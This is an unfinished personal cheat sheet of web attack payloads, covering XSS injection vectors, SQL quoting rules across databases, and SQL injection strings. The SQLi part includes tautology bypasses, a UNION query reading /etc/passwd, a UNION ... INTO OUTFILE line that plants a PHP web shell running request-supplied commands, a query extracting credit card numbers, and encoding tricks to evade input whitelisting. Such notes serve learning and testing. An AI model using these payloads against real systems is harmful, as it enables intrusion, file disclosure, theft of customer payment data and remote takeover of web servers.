# XSS

Places on a page where you can put JS:

```html
<script>
    alert('xss');
</script>

<img src="#" onerror="alert('xss')" />

<input type="button" onclick="alert('xss')" />

<iframe src="javascript:alert('xss');"></iframe>
```

# SQLi

- ANSI SQL Standard
    - Uses double quotes for table and column names. single quotes for string
      values
- MySQL
    - Uses backticks for table and column names. Single or double quotes for
      string values
    - Can be forced to use ANSI standard via `SET GLOBAL SQL_MODE=ANSI_QUOTES`
- Postgres
    - Uses double quotes for table and column names. single quotes for string
      values (follows ANSI standard)
- MS-SQL
    - ???
    - Also allows square brackets for identifier quoting
    - Can be forced to use ANSI standard via `SET QUOTED_IDENTIFIER ON`

Characters with special meanings to SQL

- '
    - the usual boundary between code and data in a SQL query
-   -
- |
- ||
- ,
- space
- .

Good SQLi strings:

```
# if you think the column is a string
" OR "1"="1
' OR '1'='1

# if the column is a string which can only be alphabetic
" OR "a"="a
' OR 'a'='a

# if the column is numeric
1 or 1=1


# mysql specific
1 UNION ALL SELECT LOAD_FILE('/etc/passwd')--

# mysql and php specific
1 UNION SELECT "<? system($_REQUEST[‘cmd’]); ?>" INTO OUTFILE "/var/www/html/victim.com/cmd.php" --
```

Rough notes

```
# looks like an email (note no spaces required around OR)
x@'OR'1'='1


input.codepoints.map {|x|  '\u' + format('%04X', x) }.join


Mary Martin' UNION SELECT creditcardnumber FROM customers WHERE customername = 'Mary Martin
```

- remember your `OR X=Y` that the type of X and Y literals need to be valid for
  the column type being checked
- use GROUP BY to guess the column name e.g. `' group by name having '1'='1`
    - if the column doesn't exist you will get an error about it not existing

Encodings that DBs will honor which can be used to avoid param whitelisting

- URI (percent) encoding
    - `URI.escape(input)`
    - used in preparation of `application/x-www-form-urlencoded` data
- URI (percent) encoding but encoding characters which are not required to be
  encoded by the spec
    - `URI.escape(input, "'?") # 2nd arg is chars to replace with percent encoded versions`

TODO finish this
